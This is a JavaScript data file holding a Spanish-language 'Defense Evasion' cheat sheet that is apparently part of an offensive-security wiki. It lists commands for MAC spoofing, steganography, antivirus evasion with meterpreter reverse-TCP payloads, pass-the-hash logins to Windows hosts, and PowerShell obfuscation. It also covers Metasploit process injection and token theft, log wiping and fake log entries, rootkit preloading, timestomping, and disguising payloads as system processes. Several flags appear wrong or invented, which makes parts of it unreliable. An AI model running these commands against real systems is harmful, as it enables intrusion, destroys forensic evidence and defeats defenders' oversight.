// Evasión de Defensas (Defense Evasion)
window.WIKI_CHEATSHEETS_07_DEFENSE_EVASION = [
 {
  "tool": "macchanger",
  "desc": "Manipular la dirección MAC de interfaces de red",
  "commands": [
   {
    "cmd": "macchanger eth0",
    "desc": "Ver MAC actual"
   },
   {
    "cmd": "macchanger -r eth0",
    "desc": "MAC aleatoria"
   },
   {
    "cmd": "macchanger -a eth0",
    "desc": "MAC aleatoria de fabricante real"
   },
   {
    "cmd": "macchanger -A eth0",
    "desc": "Todas las MAC de fabricantes"
   },
   {
    "cmd": "macchanger -p eth0",
    "desc": "Restaurar MAC física"
   },
   {
    "cmd": "macchanger -m AA:BB:CC:DD:EE:FF eth0",
    "desc": "MAC específica"
   },
   {
    "cmd": "macchanger -e eth0",
    "desc": "Igual que la actual"
   },
   {
    "cmd": "macchanger -l | head -20",
    "desc": "Listar fabricantes OUI"
   },
   {
    "cmd": "macchanger -s eth0",
    "desc": "Mostrar solo MAC"
   },
   {
    "cmd": "sudo ip link set eth0 down && macchanger -r eth0 && sudo ip link set eth0 up",
    "desc": "Cambiar MAC completa"
   }
  ]
 },
 {
  "tool": "steghide",
  "desc": "Esteganografía: ocultar datos en imágenes/audio",
  "commands": [
   {
    "cmd": "steghide embed -cf foto.jpg -ef secreto.txt -p 'pass'",
    "desc": "Ocultar archivo con pass"
   },
   {
    "cmd": "steghide embed -cf foto.jpg -ef secreto.txt -f",
    "desc": "Forzar sobrescritura"
   },
   {
    "cmd": "steghide embed -cf foto.jpg -ef data.bin -z 9",
    "desc": "Compresión máxima"
   },
   {
    "cmd": "steghide embed -cf foto.jpg -ef data.txt -Z",
    "desc": "Sin compresión"
   },
   {
    "cmd": "steghide embed -cf foto.jpg -ef secreto.txt -e none",
    "desc": "Sin cifrado"
   },
   {
    "cmd": "steghide extract -sf foto.jpg -p 'pass'",
    "desc": "Extraer archivo oculto"
   },
   {
    "cmd": "steghide extract -sf foto.jpg -xf output.txt",
    "desc": "Extraer a archivo"
   },
   {
    "cmd": "steghide info foto.jpg",
    "desc": "Ver si contiene datos"
   },
   {
    "cmd": "steghide info -p 'pass' foto.jpg",
    "desc": "Info con password"
   },
   {
    "cmd": "steghide --version",
    "desc": "Versión"
   }
  ]
 },
 {
  "tool": "stegsnow",
  "desc": "Esteganografía en texto plano (whitespace steganography)",
  "commands": [
   {
    "cmd": "stegsnow -C -p 'pass' -m 'mensaje' texto.txt",
    "desc": "Ocultar mensaje en texto"
   },
   {
    "cmd": "stegsnow -C -p 'pass' -f oculto.txt texto.txt",
    "desc": "Desde archivo"
   },
   {
    "cmd": "stegsnow -C -p 'pass' -S texto.txt",
    "desc": "Extraer mensaje"
   },
   {
    "cmd": "stegsnow -C -f data.txt -p 'pass' -o out.txt texto.txt",
    "desc": "Salida custom"
   },
   {
    "cmd": "stegsnow -C -m 'msg' -l 32 texto.txt",
    "desc": "Longitud de línea"
   },
   {
    "cmd": "stegsnow -C -p 'pass' -q texto.txt",
    "desc": "Modo silencioso"
   }
  ]
 },
 {
  "tool": "stegosuite",
  "desc": "Esteganografía GUI para imágenes (JPEG, BMP)",
  "commands": [
   {
    "cmd": "stegosuite",
    "desc": "Abrir GUI"
   },
   {
    "cmd": "stegosuite --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "outguess",
  "desc": "Esteganografía en imágenes (JPEG)",
  "commands": [
   {
    "cmd": "outguess -k 'pass' -d secreto.txt foto.jpg foto_steg.jpg",
    "desc": "Ocultar archivo"
   },
   {
    "cmd": "outguess -k 'pass' -r foto_steg.jpg secreto.txt",
    "desc": "Extraer archivo"
   },
   {
    "cmd": "outguess -k 'pass' -d secreto.txt -D foto.jpg",
    "desc": "Con overwrite"
   },
   {
    "cmd": "outguess -k 'pass' -r foto.jpg",
    "desc": "Extraer sin salida"
   },
   {
    "cmd": "outguess -k 'pass' -d data.txt -q foto.jpg out.jpg",
    "desc": "Quiet"
   },
   {
    "cmd": "outguess -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "stegdetect",
  "desc": "Detectar esteganografía en imágenes JPEG",
  "commands": [
   {
    "cmd": "stegdetect foto.jpg",
    "desc": "Detectar técnica"
   },
   {
    "cmd": "stegdetect -s 5 foto.jpg",
    "desc": "Sensibilidad"
   },
   {
    "cmd": "stegdetect -t jopi foto.jpg",
    "desc": "Técnicas específicas"
   },
   {
    "cmd": "stegdetect -v foto.jpg",
    "desc": "Verbose"
   },
   {
    "cmd": "stegdetect -o out.txt foto.jpg",
    "desc": "Salida a archivo"
   }
  ]
 },
 {
  "tool": "ccrypt",
  "desc": "Cifrado simétrico de archivos (ccrypt)",
  "commands": [
   {
    "cmd": "ccrypt archivo.txt",
    "desc": "Cifrar archivo"
   },
   {
    "cmd": "ccrypt -e archivo.txt",
    "desc": "Cifrar explícito"
   },
   {
    "cmd": "ccrypt -d archivo.txt.cpt",
    "desc": "Descifrar"
   },
   {
    "cmd": "ccencrypt -k clave archivo.txt",
    "desc": "Con clave por línea de comando"
   },
   {
    "cmd": "ccdecrypt -k clave archivo.txt.cpt",
    "desc": "Descifrar con clave"
   },
   {
    "cmd": "ccrypt -P archivo.txt",
    "desc": "Promt cambio de clave"
   },
   {
    "cmd": "ccrypt -x archivo.txt",
    "desc": "Verificar firma"
   },
   {
    "cmd": "ccrypt -f archivo.txt",
    "desc": "Forzar cifrado"
   },
   {
    "cmd": "ccrypt -H archivo.txt",
    "desc": "Cifrado sin compresión"
   },
   {
    "cmd": "ccrypt -R directorio/",
    "desc": "Recursivo"
   },
   {
    "cmd": "ccrypt -u archivo.txt",
    "desc": "Eliminar archivo original"
   },
   {
    "cmd": "ccrypt -v archivo.txt",
    "desc": "Verbose"
   },
   {
    "cmd": "ccguess clave.txt",
    "desc": "Adivinar clave"
   }
  ]
 },
 {
  "tool": "exe2hexbat",
  "desc": "Convertir exe a BAT hex para evasión de transferencia",
  "commands": [
   {
    "cmd": "exe2hex -x payload.exe -b",
    "desc": "Convertir a BAT con bits"
   },
   {
    "cmd": "exe2hex -x payload.exe -p",
    "desc": "Convertir a PowerShell"
   },
   {
    "cmd": "exe2hex -x payload.exe -e",
    "desc": "Solo PowerShell"
   },
   {
    "cmd": "exe2hex -x payload.exe -c",
    "desc": "Compacto"
   },
   {
    "cmd": "exe2hex -x payload.exe -o out.bat",
    "desc": "Salida custom"
   },
   {
    "cmd": "exe2hex -x payload.exe -r",
    "desc": "Randomizado"
   }
  ]
 },
 {
  "tool": "proxychains4",
  "desc": "Enrutar tráfico de herramientas a través de proxies",
  "commands": [
   {
    "cmd": "proxychains4 nmap -sT -Pn 10.0.0.5",
    "desc": "Nmap por proxy"
   },
   {
    "cmd": "proxychains4 -q curl http://target",
    "desc": "Curl silencioso"
   },
   {
    "cmd": "proxychains4 -f custom.conf hydra ...",
    "desc": "Config custom"
   },
   {
    "cmd": "proxychains4 nc 10.0.0.5 22",
    "desc": "Netcat por proxy"
   },
   {
    "cmd": "proxychains4 ssh user@10.0.0.5",
    "desc": "SSH por proxy"
   },
   {
    "cmd": "proxychains4 -f conf.txt -q sqlmap -u URL",
    "desc": "SQLMap por proxy"
   }
  ]
 },
 {
  "tool": "veil-evasion",
  "desc": "Evadir AV generando payloads alternativos",
  "commands": [
   {
    "cmd": "veil-evasion",
    "desc": "Abrir menú"
   },
   {
    "cmd": "veil-evasion --list",
    "desc": "Listar payloads"
   },
   {
    "cmd": "veil-evasion -p python/shellcode_inject/avet",
    "desc": "AVET payload"
   },
   {
    "cmd": "veil-evasion -p c/meterpreter/rev_tcp LHOST=IP LPORT=4444",
    "desc": "Payload C"
   },
   {
    "cmd": "veil-evasion --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "passing-the-hash",
  "desc": "Framework para ataques Pass-the-Hash en Windows",
  "commands": [
   {
    "cmd": "pth-winexe -U user%hash //192.168.1.10 cmd.exe",
    "desc": "Winexe con hash"
   },
   {
    "cmd": "pth-winexe -U admin%hash --system //192.168.1.10 cmd.exe",
    "desc": "Como SYSTEM"
   },
   {
    "cmd": "pth-rdp 192.168.1.10",
    "desc": "RDP con hash"
   },
   {
    "cmd": "pth-wmic -U admin%hash //192.168.1.10 'process list'",
    "desc": "WMI con hash"
   },
   {
    "cmd": "pth-net use \\\\192.168.1.10\\c$ /u:admin%hash",
    "desc": "Net use con hash"
   },
   {
    "cmd": "pth-smbclient -U admin%hash //192.168.1.10/c$",
    "desc": "Smbclient con hash"
   },
   {
    "cmd": "pth-curl -u admin%hash --ntlm http://192.168.1.10/",
    "desc": "Curl NTLM con hash"
   },
   {
    "cmd": "pth-ssh -p 22 admin@192.168.1.10 -pw hash",
    "desc": "SSH con hash"
   },
   {
    "cmd": "pth-rpcclient -U admin%hash 192.168.1.10",
    "desc": "RPC client con hash"
   },
   {
    "cmd": "pth-sqsh -S 192.168.1.10 -U admin -P hash",
    "desc": "SQL con hash"
   },
   {
    "cmd": "pth-firefox 192.168.1.10",
    "desc": "Firefox proxy con hash"
   }
  ]
 },
 {
  "tool": "sniffjoke",
  "desc": "Ofuscar tráfico de red para evadir detección",
  "commands": [
   {
    "cmd": "sniffjoke --dns-hack",
    "desc": "Hack de DNS"
   },
   {
    "cmd": "sniffjoke --port 80",
    "desc": "Puerto de escucha"
   },
   {
    "cmd": "sniffjoke --interface eth0",
    "desc": "Interfaz"
   },
   {
    "cmd": "sniffjoke --background",
    "desc": "Background"
   },
   {
    "cmd": "sniffjoke --verbose",
    "desc": "Verbose"
   },
   {
    "cmd": "sniffjoke --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "fragrouter",
  "desc": "Fragmentación de IP para evasión de IDS",
  "commands": [
   {
    "cmd": "fragrouter -p",
    "desc": "Modo promiscuo"
   },
   {
    "cmd": "fragrouter -B",
    "desc": "Background"
   },
   {
    "cmd": "fragrouter -f 1",
    "desc": "Estrategia 1 (fragmentación)"
   },
   {
    "cmd": "fragrouter -f 2",
    "desc": "Estrategia 2 (inversión)"
   },
   {
    "cmd": "fragrouter -f 3",
    "desc": "Estrategia 3 (interleaving)"
   },
   {
    "cmd": "fragrouter -f 4",
    "desc": "Estrategia 4 (inversión interleaving)"
   },
   {
    "cmd": "fragrouter -f 5",
    "desc": "Estrategia 5 (CRC collision)"
   },
   {
    "cmd": "fragrouter -f 6",
    "desc": "Estrategia 6 (tiny fragments)"
   },
   {
    "cmd": "fragrouter -f 7",
    "desc": "Estrategia 7 (todo)"
   },
   {
    "cmd": "fragrouter -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "ftest",
  "desc": "Probar reglas de firewall con técnicas de evasión",
  "commands": [
   {
    "cmd": "ftest -p 80 -t objetivo.com",
    "desc": "Test de puerto"
   },
   {
    "cmd": "ftest -p 1-100 -t objetivo.com",
    "desc": "Rango de puertos"
   },
   {
    "cmd": "ftest -s 53 -p 80 -t objetivo.com",
    "desc": "Puerto origen"
   },
   {
    "cmd": "ftest -f -p 80 -t objetivo.com",
    "desc": "Con fragmentación"
   },
   {
    "cmd": "ftest -v -p 80 -t objetivo.com",
    "desc": "Verbose"
   },
   {
    "cmd": "ftest -c 10 -p 80 -t objetivo.com",
    "desc": "10 paquetes"
   },
   {
    "cmd": "ftest -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "proxyhound",
  "desc": "Enumerar proxies abiertos en internet",
  "commands": [
   {
    "cmd": "proxyhound",
    "desc": "Ejecutar enumeración"
   },
   {
    "cmd": "proxyhound --limit 100",
    "desc": "Limitar resultados"
   },
   {
    "cmd": "proxyhound --output out.txt",
    "desc": "Guardar"
   },
   {
    "cmd": "proxyhound --verbose",
    "desc": "Verbose"
   }
  ]
 },
 {
  "tool": "invoke-obfuscation",
  "desc": "Ofuscación de scripts PowerShell",
  "commands": [
   {
    "cmd": "powershell -ep bypass -c 'Import-Module Invoke-Obfuscation.psd1; Invoke-Obfuscation'",
    "desc": "Abrir consola"
   },
   {
    "cmd": "powershell -ep bypass -c 'Import-Module Invoke-Obfuscation.psd1; Set-ScriptBlock -ScriptBlock \"whoami\"; Out-ObfuscatedTokenCommand'",
    "desc": "Ofuscar comando"
   },
   {
    "cmd": "powershell -ep bypass -c 'Import-Module Invoke-Obfuscation.psd1; Set-ScriptBlock -FilePath shell.ps1; Out-ObfuscatedScriptCommand'",
    "desc": "Ofuscar script"
   },
   {
    "cmd": "powershell -ep bypass -c 'Import-Module Invoke-Obfuscation.psd1; Out-EncodedCommand'",
    "desc": "Base64"
   },
   {
    "cmd": "powershell -ep bypass -c 'Import-Module Invoke-Obfuscation.psd1; Out-SecureStringCommand'",
    "desc": "SecureString"
   },
   {
    "cmd": "powershell -ep bypass -c 'Import-Module Invoke-Obfuscation.psd1; Out-CompressCommand'",
    "desc": "Comprimido"
   },
   {
    "cmd": "powershell -ep bypass -c 'Import-Module Invoke-Obfuscation.psd1; Set-ObfuscationTechnique Random'",
    "desc": "Técnica random"
   },
   {
    "cmd": "powershell -ep bypass -c 'Import-Module Invoke-Obfuscation.psd1; Set-ObfuscationTechnique Token'",
    "desc": "Token"
   },
   {
    "cmd": "powershell -ep bypass -c 'Import-Module Invoke-Obfuscation.psd1; Out-EncodedCommand -FilePath shell.ps1'",
    "desc": "Encoded de archivo"
   },
   {
    "cmd": "powershell -ep bypass -c 'Import-Module Invoke-Obfuscation.psd1; Set-ObfuscationTechnique ALL; Out-ObfuscatedScriptCommand'",
    "desc": "Todo"
   }
  ]
 },
 {
  "tool": "torsocks",
  "desc": "Enrutar comandos a través de la red Tor",
  "commands": [
   {
    "cmd": "torsocks curl http://example.com",
    "desc": "curl vía Tor"
   },
   {
    "cmd": "torsocks nmap -sT -Pn IP",
    "desc": "nmap vía Tor"
   },
   {
    "cmd": "torsocks wget URL",
    "desc": "wget vía Tor"
   },
   {
    "cmd": "torsocks ssh user@host",
    "desc": "SSH vía Tor"
   },
   {
    "cmd": "torsocks git clone URL",
    "desc": "git vía Tor"
   },
   {
    "cmd": "torsocks python3 script.py",
    "desc": "Python vía Tor"
   },
   {
    "cmd": "torsocks firefox",
    "desc": "Firefox vía Tor"
   },
   {
    "cmd": "torsocks -p 9050 curl URL",
    "desc": "Puerto SOCKS"
   },
   {
    "cmd": "torsocks -i curl URL",
    "desc": "Aislado"
   },
   {
    "cmd": "torsocks -d",
    "desc": "Debug"
   },
   {
    "cmd": "torsocks -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "openvpn",
  "desc": "VPN (evasión y acceso a redes)",
  "commands": [
   {
    "cmd": "openvpn --config client.ovpn",
    "desc": "Conectar"
   },
   {
    "cmd": "openvpn --config client.ovpn --daemon",
    "desc": "Daemon"
   },
   {
    "cmd": "openvpn --config client.ovpn --auth-nocache",
    "desc": "Sin cache"
   },
   {
    "cmd": "openvpn --config client.ovpn --route 10.0.0.0 255.0.0.0",
    "desc": "Ruta extra"
   },
   {
    "cmd": "openvpn --config client.ovpn --proto tcp",
    "desc": "TCP"
   },
   {
    "cmd": "openvpn --config client.ovpn --proto udp",
    "desc": "UDP"
   },
   {
    "cmd": "openvpn --config client.ovpn --port 443",
    "desc": "Puerto"
   },
   {
    "cmd": "openvpn --config client.ovpn --connect-retry 5",
    "desc": "Reintentos"
   },
   {
    "cmd": "openvpn --config client.ovpn --log /tmp/vpn.log",
    "desc": "Log"
   },
   {
    "cmd": "openvpn --config client.ovpn --verb 3",
    "desc": "Verbosity"
   },
   {
    "cmd": "openvpn --config client.ovpn --tls-cipher TLS-ECDHE-RSA-WITH-AES-256-GCM-SHA384",
    "desc": "Cipher"
   },
   {
    "cmd": "openvpn --config client.ovpn --auth SHA256",
    "desc": "Auth"
   },
   {
    "cmd": "openvpn --genkey --secret key.txt",
    "desc": "Generar key"
   },
   {
    "cmd": "openvpn --version",
    "desc": "Versión"
   }
  ]
 },
 {
  "tool": "tor",
  "desc": "Red de anonimización Tor",
  "commands": [
   {
    "cmd": "tor",
    "desc": "Iniciar relay de cliente"
   },
   {
    "cmd": "tor --SocksPort 9050",
    "desc": "Puerto SOCKS"
   },
   {
    "cmd": "tor --ControlPort 9051",
    "desc": "Puerto control"
   },
   {
    "cmd": "tor --DataDirectory /tmp/tor",
    "desc": "Data dir"
   },
   {
    "cmd": "tor --Log notice stdout",
    "desc": "Log"
   },
   {
    "cmd": "tor --RunAsDaemon 1",
    "desc": "Daemon"
   },
   {
    "cmd": "tor --ExitNodes {us}",
    "desc": "Nodos de salida"
   },
   {
    "cmd": "tor --ExcludeNodes {ru},{cn}",
    "desc": "Excluir nodos"
   },
   {
    "cmd": "tor --StrictNodes 1",
    "desc": "Solo nodos permitidos"
   },
   {
    "cmd": "tor --BridgeRelay 1",
    "desc": "Bridge"
   },
   {
    "cmd": "tor --HiddenServiceDir /tmp/hs --HiddenServicePort 80,127.0.0.1:8080",
    "desc": "Servicio oculto"
   },
   {
    "cmd": "tor --CircuitsAvailableTimeout 60",
    "desc": "Timeout"
   },
   {
    "cmd": "tor --MaxCircuitDirtiness 600",
    "desc": "Max dirt"
   }
  ]
 },
 {
  "tool": "privoxy",
  "desc": "Proxy HTTP con filtrado (para Tor)",
  "commands": [
   {
    "cmd": "privoxy",
    "desc": "Iniciar con /etc/privoxy/config"
   },
   {
    "cmd": "privoxy --config config",
    "desc": "Config"
   },
   {
    "cmd": "privoxy --no-daemon",
    "desc": "Foreground"
   },
   {
    "cmd": "privoxy --version",
    "desc": "Versión"
   }
  ]
 },
 {
  "tool": "xencrypt",
  "desc": "Ofuscador de scripts PowerShell (xencrypt)",
  "commands": [
   {
    "cmd": "python3 xencrypt.py -i payload.ps1 -o out.ps1",
    "desc": "Ofuscar"
   },
   {
    "cmd": "python3 xencrypt.py -i payload.ps1 -o out.ps1 -l",
    "desc": "Técnicas aleatorias"
   },
   {
    "cmd": "python3 xencrypt.py -i payload.ps1 -o out.ps1 -t 5",
    "desc": "5 técnicas"
   },
   {
    "cmd": "python3 xencrypt.py -i payload.ps1 -o out.ps1 -e 3",
    "desc": "Encodings"
   },
   {
    "cmd": "python3 xencrypt.py -i payload.ps1 -o out.ps1 -v",
    "desc": "Verbose"
   },
   {
    "cmd": "python3 xencrypt.py -i payload.ps1 -o out.ps1 -r",
    "desc": "Resolver"
   },
   {
    "cmd": "python3 xencrypt.py -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "timestomp",
  "desc": "Modificar timestamps de archivos (Windows)",
  "commands": [
   {
    "cmd": "timestomp file -m 01/02/2026 12:00:00",
    "desc": "Modificar todo"
   },
   {
    "cmd": "timestomp file -c 01/02/2026 12:00:00",
    "desc": "Creation"
   },
   {
    "cmd": "timestomp file -a 01/02/2026 12:00:00",
    "desc": "Access"
   },
   {
    "cmd": "timestomp file -w 01/02/2026 12:00:00",
    "desc": "Write"
   },
   {
    "cmd": "timestomp file -e",
    "desc": "Extra (NTFS)"
   },
   {
    "cmd": "timestomp file -b",
    "desc": "Borrar timestamps"
   },
   {
    "cmd": "timestomp file -v",
    "desc": "Verbose"
   },
   {
    "cmd": "timestomp file -f",
    "desc": "Fuerza"
   },
   {
    "cmd": "timestomp file -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "tor-browser",
  "desc": "Navegador Tor (anonimato y evasión)",
  "commands": [
   {
    "cmd": "tor-browser",
    "desc": "Iniciar"
   },
   {
    "cmd": "tor-browser --profile /tmp/tb",
    "desc": "Perfil"
   },
   {
    "cmd": "tor-browser --new-instance",
    "desc": "Nueva instancia"
   },
   {
    "cmd": "tor-browser --proxy-server socks5://127.0.0.1:9050",
    "desc": "Proxy"
   },
   {
    "cmd": "tor-browser --incognito",
    "desc": "Incógnito"
   },
   {
    "cmd": "tor-browser --safe-mode",
    "desc": "Modo seguro"
   },
   {
    "cmd": "tor-browser --disable-extensions",
    "desc": "Sin extensiones"
   },
   {
    "cmd": "tor-browser --no-sandbox",
    "desc": "Sin sandbox"
   },
   {
    "cmd": "tor-browser --headless --dump-dom URL",
    "desc": "Headless"
   },
   {
    "cmd": "tor-browser --version",
    "desc": "Versión"
   }
  ]
 },
 {
  "tool": "process-injection",
  "desc": "Inyección de procesos (migración, PPID spoofing)",
  "commands": [
   {
    "cmd": "msfconsole -q -x 'use post/windows/manage/migrate; set SESSION 1; run'",
    "desc": "Migrar"
   },
   {
    "cmd": "msfconsole -q -x 'use post/windows/manage/migrate; set SESSION 1; set TARGET x64; run'",
    "desc": "Migrar x64"
   },
   {
    "cmd": "msfconsole -q -x 'use post/windows/gather/peekaboo; set SESSION 1; run'",
    "desc": "Peekaboo"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/windows/local/ps_wmi_exec; set SESSION 1; run'",
    "desc": "WMI exec"
   },
   {
    "cmd": "msfconsole -q -x 'use post/windows/manage/reflective_dll_inject; set SESSION 1; set DLL /tmp/x.dll; run'",
    "desc": "DLL inject"
   },
   {
    "cmd": "msfconsole -q -x 'use post/multi/general/execute; set SESSION 1; set CMD whoami; run'",
    "desc": "Exec en sesión"
   },
   {
    "cmd": "meterpreter> migrate PID",
    "desc": "Migrar a PID"
   },
   {
    "cmd": "meterpreter> getpid",
    "desc": "PID actual"
   },
   {
    "cmd": "meterpreter> ps",
    "desc": "Procesos"
   },
   {
    "cmd": "meterpreter> steal_token PID",
    "desc": "Robar token"
   },
   {
    "cmd": "meterpreter> getsystem",
    "desc": "GetSystem"
   },
   {
    "cmd": "meterpreter> shell",
    "desc": "Shell"
   },
   {
    "cmd": "msfconsole -q -x 'use post/windows/manage/priv_migrate; set SESSION 1; run'",
    "desc": "Priv migrate"
   },
   {
    "cmd": "meterpreter> rev2self",
    "desc": "Revertir"
   }
  ]
 },
 {
  "tool": "log-cleaning",
  "desc": "Limpieza de logs (evasión de defensas)",
  "commands": [
   {
    "cmd": "sed -i '/192.168.1.100/d' /var/log/auth.log",
    "desc": "Borrar IP de auth.log"
   },
   {
    "cmd": "sed -i '/Failed password/d' /var/log/auth.log",
    "desc": "Borrar fallidos"
   },
   {
    "cmd": "grep -v 'sshd' /var/log/auth.log > /tmp/t && mv /tmp/t /var/log/auth.log",
    "desc": "Filtrar sshd"
   },
   {
    "cmd": "sed -i '/cron/d' /var/log/syslog",
    "desc": "Borrar cron"
   },
   {
    "cmd": "shred -u /var/log/auth.log",
    "desc": "Borrado seguro"
   },
   {
    "cmd": "history -c && rm ~/.bash_history",
    "desc": "Limpiar history"
   },
   {
    "cmd": "truncate -s 0 /var/log/auth.log",
    "desc": "Vaciar"
   },
   {
    "cmd": "journalctl --vacuum-time=1s",
    "desc": "Vaciar journal"
   },
   {
    "cmd": "echo '' > /var/log/wtmp",
    "desc": "Vaciar wtmp"
   },
   {
    "cmd": "echo '' > /var/log/btmp",
    "desc": "Vaciar btmp"
   },
   {
    "cmd": "rm /var/log/kern.log",
    "desc": "Borrar kernel log"
   },
   {
    "cmd": "find /var/log -name '*auth*' -delete",
    "desc": "Borrar auth logs"
   },
   {
    "cmd": "> /var/log/syslog",
    "desc": "Vaciar syslog"
   },
   {
    "cmd": "logger -t sshd 'Accepted password for root from 10.0.0.1'",
    "desc": "Fake log"
   },
   {
    "cmd": "touch -d '2026-01-01' /var/log/auth.log",
    "desc": "Cambiar fecha"
   }
  ]
 },
 {
  "tool": "rootkit-basics",
  "desc": "Conceptos de rootkits (LKM, LD_PRELOAD)",
  "commands": [
   {
    "cmd": "cat /proc/modules | head",
    "desc": "Módulos cargados"
   },
   {
    "cmd": "lsmod | grep -i hide",
    "desc": "Módulos sospechosos"
   },
   {
    "cmd": "find / -name '*.ko' 2>/dev/null",
    "desc": "Buscar .ko"
   },
   {
    "cmd": "insmod rootkit.ko",
    "desc": "Cargar módulo"
   },
   {
    "cmd": "rmmod rootkit.ko",
    "desc": "Descargar"
   },
   {
    "cmd": "echo 'export LD_PRELOAD=/tmp/hook.so' >> /etc/ld.so.preload",
    "desc": "LD_PRELOAD"
   },
   {
    "cmd": "cat /etc/ld.so.preload",
    "desc": "Ver preload"
   },
   {
    "cmd": "ldd /bin/ls | head",
    "desc": "Libs de ls"
   },
   {
    "cmd": "strings /bin/ls | grep -i hidden",
    "desc": "Buscar strings"
   },
   {
    "cmd": "strace -e openat ls 2>&1 | head",
    "desc": "Trazar"
   },
   {
    "cmd": "dmesg | grep -i rootkit",
    "desc": "Kernel log"
   },
   {
    "cmd": "chkrootkit",
    "desc": "Detectar"
   },
   {
    "cmd": "rkhunter --check",
    "desc": "Rkhunter"
   },
   {
    "cmd": "find / -name '*.so' -newer /etc/passwd 2>/dev/null",
    "desc": "SO recientes"
   }
  ]
 },
 {
  "tool": "timestomp",
  "desc": "Manipulación de timestamps (anti-forense)",
  "commands": [
   {
    "cmd": "touch -t 202601011200 /tmp/file",
    "desc": "Cambiar fecha"
   },
   {
    "cmd": "touch -d '2026-01-01 12:00:00' file",
    "desc": "Fecha ISO"
   },
   {
    "cmd": "stat file",
    "desc": "Ver timestamps"
   },
   {
    "cmd": "touch -a -d '2026-01-01' file",
    "desc": "Solo access"
   },
   {
    "cmd": "touch -m -d '2026-01-01' file",
    "desc": "Solo mtime"
   },
   {
    "cmd": "cp -p file file2",
    "desc": "Copiar conservando"
   },
   {
    "cmd": "ls -la --time=atime file",
    "desc": "Atime"
   },
   {
    "cmd": "ls -la --time=ctime file",
    "desc": "Ctime"
   },
   {
    "cmd": "debugfs -w -R 'set_inode_field /tmp/file ctime 20260101120000' /dev/sda1",
    "desc": "Ctime"
   },
   {
    "cmd": "timestomp file -m '01/01/2026 00:00:00'",
    "desc": "Timestomp win"
   },
   {
    "cmd": "timestomp file -b",
    "desc": "Borrar"
   },
   {
    "cmd": "timestomp file -z",
    "desc": "Zero"
   },
   {
    "cmd": "find / -newer /etc/passwd -mmin -5 2>/dev/null",
    "desc": "Archivos recientes"
   },
   {
    "cmd": "python3 -c 'import os; os.utime(\"/tmp/file\", (1609459200, 1609459200))'",
    "desc": "Py utime"
   }
  ]
 },
 {
  "tool": "artifact-cleanup",
  "desc": "Limpieza de artefactos (bash, vsftpd, tools)",
  "commands": [
   {
    "cmd": "history -c && rm -f ~/.bash_history && touch ~/.bash_history",
    "desc": "History"
   },
   {
    "cmd": "sed -i '/nc -e/d' ~/.bash_history",
    "desc": "Filtrar nc"
   },
   {
    "cmd": "rm -rf /var/log/apache2/*.log",
    "desc": "Apache logs"
   },
   {
    "cmd": "rm -rf /var/log/nginx/*.log",
    "desc": "Nginx logs"
   },
   {
    "cmd": "find /var/log -type f -delete",
    "desc": "Borrar logs"
   },
   {
    "cmd": "grep -r '10.0.0.5' /var/log/ 2>/dev/null | cut -d: -f1 | sort -u",
    "desc": "IP en logs"
   },
   {
    "cmd": "journalctl --vacuum-size=1K",
    "desc": "Vaciar journal"
   },
   {
    "cmd": "rm -f /tmp/*.log /tmp/nc*",
    "desc": "Tmp logs"
   },
   {
    "cmd": "find /tmp -name '*nmap*' -delete",
    "desc": "Nmap tmp"
   },
   {
    "cmd": "rm -rf /home/user/.wget-hsts",
    "desc": "Wget hsts"
   },
   {
    "cmd": "unset HISTFILE && history -c",
    "desc": "Sin hist"
   },
   {
    "cmd": "shred -zu /tmp/payload",
    "desc": "Borrar payload"
   },
   {
    "cmd": "last | grep reboot",
    "desc": "Reboots"
   },
   {
    "cmd": "rm -rf /var/log/wtmp /var/log/btmp && touch /var/log/wtmp /var/log/btmp",
    "desc": "Wtmp btmp"
   },
   {
    "cmd": "find / -name '.*history' -mmin -60 2>/dev/null",
    "desc": "Histories recientes"
   }
  ]
 },
 {
  "tool": "process-spoof",
  "desc": "Spoofing de procesos (nombres, PID)",
  "commands": [
   {
    "cmd": "cp /tmp/payload /tmp/[kworker] && /tmp/[kworker]",
    "desc": "Nombre falso"
   },
   {
    "cmd": "/tmp/payload & disown",
    "desc": "Ejecutar en fondo"
   },
   {
    "cmd": "setsid /tmp/payload",
    "desc": "Nueva sesión"
   },
   {
    "cmd": "nohup /tmp/payload >/dev/null 2>&1 &",
    "desc": "Nohup"
   },
   {
    "cmd": "exec -a sshd /tmp/payload",
    "desc": "argv[0] falso"
   },
   {
    "cmd": "python3 -c 'import os; os.execv(\"/tmp/p\", [\"/tmp/sshd\", \"-D\"])'",
    "desc": "Py execv"
   },
   {
    "cmd": "prctl",
    "desc": "PRCTL name"
   },
   {
    "cmd": "name=shellname /tmp/payload",
    "desc": "Env name"
   },
   {
    "cmd": "kill -STOP PID && mv /proc/PID/comm",
    "desc": "Detener"
   },
   {
    "cmd": "echo sshd > /proc/PID/comm 2>/dev/null || true",
    "desc": "Cambiar comm"
   },
   {
    "cmd": "ps aux | grep -v grep | grep -i sshd",
    "desc": "Ver proceso"
   },
   {
    "cmd": "pgrep -f '/tmp/'",
    "desc": "Buscar tmp"
   },
   {
    "cmd": "hidepid mount",
    "desc": "Mount hidepid"
   }
  ]
 }
];
